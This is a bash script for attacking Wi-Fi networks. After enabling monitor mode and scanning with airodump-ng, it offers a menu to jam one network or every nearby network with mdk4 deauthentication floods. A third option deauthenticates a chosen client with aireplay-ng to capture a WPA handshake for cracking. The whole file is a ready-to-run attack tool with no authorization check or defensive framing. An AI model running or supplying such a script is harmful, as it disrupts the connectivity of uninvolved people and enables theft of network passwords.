#!/bin/bash
set -e  # Exit on error
set -u  # Treat unset variables as errors

# Define Colors
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
NC='\033[0m'  # No Color

# Function to print info messages
print_info() {
    echo -e "${CYAN}[INFO]$NC $1"
}

# Function to print success messages
print_success() {
    echo -e "${CYAN}[SUCCESS]$NC $1"
}

# Function to print error messages
print_error() {
    echo -e "${YELLOW}[ERROR]$NC $1"
}

# Function to validate MAC addresses
validate_mac() {
    if ! [[ "$1" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]; then
        print_error "Invalid MAC address format!"
        exit 1
    fi
}

# Function to validate channel number
validate_channel() {
    if ! [[ "$1" =~ ^[0-9]+$ ]] || (( $1 < 1 || $1 > 11 )); then
        print_error "Invalid channel number! It must be between 1 and 11."
        exit 1
    fi
}

# Function to activate monitor mode and check for Wi-Fi adapters
activate_monitor_mode() {
    print_info "Available wireless adapters:"
    adapters=($(iwconfig 2>/dev/null | grep -o '^[[:alnum:]]\+'))

    if [ ${#adapters[@]} -eq 0 ]; then
        print_error "No wireless adapters found."
        exit 1
    fi

    for i in "${!adapters[@]}"; do
        echo "$((i+1)). ${adapters[i]}"
    done

    read -p "$(echo -e "${CYAN}Select the adapter number (1-${#adapters[@]}): ${NC}")" choice
    if [[ ! "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#adapters[@]} )); then
        print_error "Invalid selection."
        exit 1
    fi

    adapter="${adapters[$((choice-1))]}"
    print_success "Using adapter: $adapter"

    sudo ifconfig "$adapter" down || { print_error "Failed to bring down $adapter"; exit 1; }
    sudo iwconfig "$adapter" mode monitor || { print_error "Failed to set monitor mode"; exit 1; }
    sudo iwconfig "$adapter" retry 1 || { print_error "Failed to set retry limit"; exit 1; }
    sudo ifconfig "$adapter" up || { print_error "Failed to bring up $adapter"; exit 1; }

    if ! command -v timeout >/dev/null 2>&1; then
        print_info "timeout command not found. Running aireplay-ng without timeout."
        sudo aireplay-ng --test "$adapter" || { print_error "aireplay-ng test failed"; exit 1; }
    else
        sudo timeout 10s aireplay-ng --test "$adapter" || { print_error "aireplay-ng test failed"; exit 1; }
    fi
}

run_airodump() {
    print_info "[*] Running airodump-ng for 15 seconds..."
    sudo airodump-ng "$adapter" & 
    airodump_pid=$!
    sleep 15
    sudo kill "$airodump_pid" 2>/dev/null
    print_info "[*] airodump-ng session completed."
}

# Function to handle jamming specific network
jam_network_final() {
    sudo iwconfig "$adapter" channel "$channel" || { print_error "Failed to set channel"; exit 1; }
    sudo mdk4 "$adapter" d -B "$bssid"
}

# Function to jam all nearby networks
jam_all_networks_final() {
    sudo mdk4 "$adapter" d -s 100
}

# Function to crack password
crack_password_final() {
    FILENAME="capture_$(date +%Y%m%d%H%M%S).cap"
    sudo aireplay-ng -0 20 -a "$bssid" -c "$client_mac" "$adapter"
    sudo airodump-ng --bssid "$bssid" --channel "$channel" --write "$FILENAME" "$adapter"
    print_success "[*] Handshake captured and saved in $FILENAME."
}

# Attack Menu
attack_menu() {
    while true; do
        echo
        print_info "Choose an attack option:"
        echo -e "  1. Jam a Specific Network"
        echo -e "  2. Jam All Networks"
        echo -e "  3. Crack Wi-Fi Password"
        echo -e "  4. Exit"
        echo

        read -rp "$(echo -e "${CYAN}Enter your choice (1/2/3/4): ${NC}")" action_choice

        case "$action_choice" in
            1)
                echo
                read -rp "$(echo -e "${CYAN}Enter Target BSSID (AA:BB:CC:DD:EE:FF): ${NC}")" bssid
                validate_mac "$bssid"

                read -rp "$(echo -e "${CYAN}Enter Channel Number (e.g., 6): ${NC}")" channel
                validate_channel "$channel"

                export adapter bssid channel
                gnome-terminal -- bash -c "$(declare -f jam_network_final print_info); jam_network_final"
                ;;
            2)
                export adapter
                gnome-terminal -- bash -c "$(declare -f jam_all_networks_final print_info); jam_all_networks_final"
                ;;
            3)
                echo
                read -rp "$(echo -e "${CYAN}Enter Target BSSID (AA:BB:CC:DD:EE:FF): ${NC}")" bssid
                validate_mac "$bssid"

                read -rp "$(echo -e "${CYAN}Enter Channel Number (e.g., 6): ${NC}")" channel
                validate_channel "$channel"

                read -rp "$(echo -e "${CYAN}Enter Client MAC (FF:EE:DD:CC:BB:AA): ${NC}")" client_mac
                validate_mac "$client_mac"

                export adapter bssid channel client_mac
                gnome-terminal -- bash -c "$(declare -f crack_password_final print_info print_success); crack_password_final"
                ;;
            4)
                print_info "Exiting attack menu."
                break
                ;;
            *)
                print_error "Invalid option selected."
                ;;
        esac

        echo
        read -rp "$(echo -e "${YELLOW}Press Enter to return to the attack menu...${NC}")"
    done
}

# Main Execution

activate_monitor_mode
run_airodump

echo "[*] Launching attack menu in new terminal..."
export adapter
gnome-terminal -- bash -c "$(declare -f jam_network_final jam_all_networks_final crack_password_final attack_menu); attack_menu"
